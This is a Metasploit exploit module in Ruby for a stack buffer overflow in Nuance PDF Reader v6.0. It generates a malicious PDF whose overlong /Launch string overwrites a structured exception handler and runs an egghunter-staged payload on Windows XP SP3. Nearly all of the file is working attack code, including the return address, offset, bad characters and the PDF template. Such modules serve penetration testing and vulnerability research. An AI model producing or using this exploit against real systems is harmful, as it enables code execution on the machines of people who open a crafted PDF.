##
# $Id: nuance_pdf_launch_overflow.rb 11516 2011-01-08 01:13:26Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Egghunter

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'Nuance PDF Reader v6.0 Launch Stack Buffer Overflow',
			'Description' 	=> %q{
					This module exploits a stack buffer overflow in Nuance PDF Reader v6.0. The vulnerability is
					triggered when opening a malformed PDF file that contains an overly long string in a /Launch field. This results in overwriting a structured exception handler record.
					This exploit does not use javascript.
			},
			'License'	=> MSF_LICENSE,
			'Version'        => "$Revision: 11516 $",
			'Author'	=>
				[
					'corelanc0d3r',
					'rick2600',
				],
			'References'     =>
				[
					[ 'OSVDB', '68514'],
					[ 'URL', 'http://www.corelan.be:8800/index.php/forum/security-advisories/corelan-10-062-stack-buffer-overflow-in-nuance-pdf-reader-v6-0/' ]
				],
			'Payload'	=>
				{
					'BadChars'	=> "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0d\x22\x28\x29\x2F\x5c\x3c\x3e\x5e\x7e",

				},
			'Platform'	=> 'win',
			'Targets'	=>
				[
					[ 'Nuance PDF Reader v6.x (XP SP3)', { 'Ret' =>  0x10191579, 'Offset' => 1290 } ] #ppr - pluscore.dll
				],
			'DisclosureDate' => 'Oct 08 2010',
			'DefaultTarget'	=> 0))

		register_options(
			[
				OptString.new('FILENAME', [ false, 'The output filename.', 'corelannuance.pdf'])
			], self.class)
	end

	def exploit

		file_name = datastore['FILENAME']

		badchars=""
		eggoptions =
		{
		:checksum => true,
		:eggtag => "w00t"
		}
		hunter,egg = generate_egghunter(payload.encoded,badchars,eggoptions)

		pdfpart1 = "%PDF-1.4\n"
		pdfpart1 << "1 0 obj\n"
		pdfpart1 << "<</Type/Page/Parent 4 0 R /Resources 6 0 R /MediaBox[ 0 0 000 000]"
		pdfpart1 << "/Group<</S/Transparency/CS/DeviceRGB/I true>>/Contents 2 0 R "
		pdfpart1 << "/Annots[ 24 0 R  25 0 R  9 0 R ]>>\n"
		pdfpart1 << "endobj\n"
		pdfpart1 << "4 0 obj\n"
		pdfpart1 << "<</Type/Pages/Resources 6 0 R /MediaBox[ 0 0 000 000]/Kids[ 1 0 R ]/Count 1>>\n"
		pdfpart1 << "endobj\n"
		pdfpart1 << "7 0 obj\n"
		pdfpart1 << "<</Type/Catalog/Pages 4 0 R /OpenAction[ 1 0 R /XYZ null null 0]/Lang(en-US)/Names 28 0 R >>\n"
		pdfpart1 << "endobj\n"
		pdfpart1 << "9 0 obj\n"
		pdfpart1 << "<</Type/Annot/Subtype/Screen/P 1 0 R /M(E:000000000000000-00'00')/F 4/Rect[ "
		pdfpart1 << "000.000 000.000 000.000 000.000]/BS<</S/S/W 1>>/BE<</S/S>>/MK<</BC[ 0 0 1]"
		pdfpart1 << "/R 0/IF<</SW/A/S/A/FB false/A[ 0.5 0.5]>>>>/AP<</N 10 0 R >>/T()/A 12 0 R /AA 17 0 R >>\n"
		pdfpart1 << "endobj\n"
		pdfpart1 << "16 0 obj\n"
		pdfpart1 << "<</Type/Action/S/Launch/F<</F(/C/"

		pdfpart2 = ")>>/NewWindow true>>\n"
		pdfpart2 << "endobj\n"
		pdfpart2 << "17 0 obj\n"
		pdfpart2 << "<</PV 16 0 R >>\n"
		pdfpart2 << "endobj\n"
		pdfpart2 << "trailer\n"
		pdfpart2 << "<</Root 7 0 R /Info 8 0 R /ID[<00000000000000000000000000000000><00000000000000000000000000000000>]"
		pdfpart2 << "/DocChecksum/00000000000000000000000000000000/Size 31>>\n"
		pdfpart2 << "startxref\n"
		pdfpart2 << "0000\n"
		pdfpart2 << "%%EOF\n"

		buffer = "\x01" * target['Offset']
		nseh = "\xeb\x06\x41\x41"
		seh = [target.ret].pack('V')
		buffer2 = "\x01" * (6908 - hunter.length - egg.length)

		tweakhunter = "\x5a"

		makepdf = pdfpart1 + buffer + nseh + seh + tweakhunter + hunter + egg + buffer2 + pdfpart2

		print_status("Creating '#{datastore['FILENAME']}' file...")
		file_create(makepdf)

	end

end
